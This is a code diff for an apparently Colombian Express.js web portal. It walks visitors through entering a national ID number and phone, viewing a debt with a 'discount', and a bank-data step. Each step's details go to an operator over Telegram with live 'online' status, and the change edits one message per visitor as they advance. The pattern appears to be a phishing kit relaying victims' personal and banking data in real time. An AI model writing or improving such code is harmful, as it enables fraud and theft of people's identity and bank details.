@@ -3,7 +3,7 @@
 const express = require('express');
 const router  = express.Router();
 const { buscarPorCedula } = require('../data/loader');
-const { enviar, horaActual, registrar, completar } = require('../utils/telegram');
+const { notificar, horaActual, registrar, completar } = require('../utils/telegram');
 
 // Formatea un número como moneda colombiana: $1.234.567
 function formatCOP(val) {
@@ -29,11 +29,12 @@ router.post('/paso1', (req, res) => {
   }
 
   registrar(cedula, 'Paso 1', cedula);
-  enviar(
+  notificar(cedula,
     `📲 <b>Nuevo cliente en el portal</b>\n` +
     `👤 Cédula: <code>${cedula}</code>\n` +
     `📱 Teléfono: ${telefono}\n` +
-    `🕐 ${horaActual()}`
+    `🕐 ${horaActual()}`,
+    true  // primer mensaje → sendMessage
   );
 
   res.redirect(`/paso2?cedula=${encodeURIComponent(cedula)}`);
@@ -49,13 +50,13 @@ router.get('/paso2', (req, res) => {
   const valorPagar  = cliente ? String(Math.round(Number(cliente['SALDO TOTAL']) || 0)) : '';
 
   registrar(cedula, 'Paso 2', nombre || cedula);
-  enviar(
+  notificar(cedula,
     `📋 <b>Paso 2 — Datos del cliente</b>\n` +
     `👤 ${nombre || '(no encontrado en BD)'}\n` +
     `🆔 Cédula: <code>${cedula}</code>\n` +
     `📄 Producto: ${numProducto || '—'}\n` +
     `💰 Valor a pagar: ${formatCOP(valorPagar) || '—'}\n` +
-    `🟢 En línea\n` +
+    `🟢 En línea — Paso 2\n` +
     `🕐 ${horaActual()}`
   );
 
@@ -84,12 +85,12 @@ router.post('/paso2', (req, res) => {
   }
 
   registrar(cedula, 'Paso 3', nombreCliente);
-  enviar(
+  notificar(cedula,
     `✅ <b>Paso 2 completado</b>\n` +
     `👤 ${nombreCliente}\n` +
     `💰 Valor a pagar: ${formatCOP(valorPagar)}\n` +
     `💸 Valor con descuento: ${otroValor ? formatCOP(otroValor) : 'No indicado'}\n` +
-    `➡️ Avanzó al Paso 3\n` +
+    `➡️ Avanzando al Paso 3\n` +
     `🕐 ${horaActual()}`
   );
 
@@ -107,10 +108,10 @@ router.get('/paso3', (req, res) => {
   const otroValor     = req.query.otroValor      || '';
 
   registrar(cedula, 'Paso 3', nombreCliente);
-  enviar(
+  notificar(cedula,
     `🏦 <b>Paso 3 — Datos bancarios</b>\n` +
     `👤 ${nombreCliente}\n` +
-    `🟢 En línea\n` +
+    `🟢 En línea — Paso 3\n` +
     `🕐 ${horaActual()}`
   );
 
@@ -144,8 +145,8 @@ router.post('/paso3', (req, res) => {
     });
   }
 
-  completar(cedula);
-  enviar(
+  // Notificar antes de eliminar la sesión para poder editar el mensaje
+  notificar(cedula,
     `🎉 <b>¡FLUJO COMPLETADO!</b>\n` +
     `👤 ${nombreCliente}\n` +
     `🆔 Cédula: <code>${cedula}</code>\n` +
@@ -157,6 +158,7 @@ router.post('/paso3', (req, res) => {
     `✅ Pago enviado\n` +
     `🕐 ${horaActual()}`
   );
+  completar(cedula);
 
   res.render('confirmacion', {
     title: '¡Pago enviado!',
